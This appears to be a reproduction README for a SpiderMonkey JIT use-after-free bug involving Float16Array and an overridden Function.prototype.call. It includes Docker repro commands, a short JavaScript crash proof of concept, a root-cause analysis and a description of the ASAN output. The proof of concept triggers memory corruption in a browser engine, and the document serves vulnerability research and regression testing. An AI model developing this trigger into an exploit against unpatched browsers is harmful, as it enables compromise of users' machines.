# Bug 1987481 — CVE-2025-11153: GC memory corruption with Float16Array + Function.prototype.call override

- **Bugzilla**: https://bugzilla.mozilla.org/show_bug.cgi?id=1987481
- **Component**: JavaScript Engine: JIT
- **Keywords**: csectype-jit, regression, reporter-external, sec-high
- **CVE**: CVE-2025-11153
- **Date filed**: 2025-09-08
- **Fix commit**: `4e0b3249af9b343c82cb8bd1f5f2db3ed5f6ef0b` (2025-09-11, Ryan Hunt)
  > Bug 1987481: Adjust ArrayBufferViewElementsWithOffset. r=iain
- **Phabricator**: D264542 / D264543 / D264546

## Reproduce

```bash
docker build -t smlijun/spidermonkey.x86_64:1987481 .
docker run --rm \
  -v $(pwd)/poc.js:/testcase/poc.js \
  smlijun/spidermonkey.x86_64:1987481 \
  sh -c "/out/js --baseline-warmup-threshold=10 --ion-warmup-threshold=100 --gc-zeal=15 /testcase/poc.js"
```

Or:

```bash
cd .. && ./crash_check.sh 1987481
```

## PoC (verbatim from Bugzilla)

```js
function crash(value) {
  var array = new Float16Array(10).subarray(1);
  array[0] = Math.f16round(value);
  Function.prototype.call = function () {
    value++;
  };
  crash(array[0], value);
}

for (var i = 0; i < 100; ++i) {
  crash(i);
}
```

## Root cause

`ArrayBufferViewElementsWithOffset` (the CacheIR/MacroAssembler helper that
materialises a typed array's data pointer for an inline element write)
caches the pointer as a raw register without registering it as a "buffer
pointer" that `Nursery::forwardBufferPointer()` can update. Once the JIT
re-enters JS via the overridden `Function.prototype.call`, a minor GC fires
under `--gc-zeal=15`, moves the nursery-allocated typed array's backing,
and the cached pointer in the in-flight JIT frame is left dangling. When
control returns to the outer stub, the next typed-array write goes through
freed memory.

The fix changes the helper to record the pointer via the proper accessor
so the forwarder updates it on minor GC.

## Crash output

ASAN reports a heap UAF in `js::Nursery::forwardBufferPointer()` or the
typed-array store path; see `output.txt` after `crash_check.sh` runs.
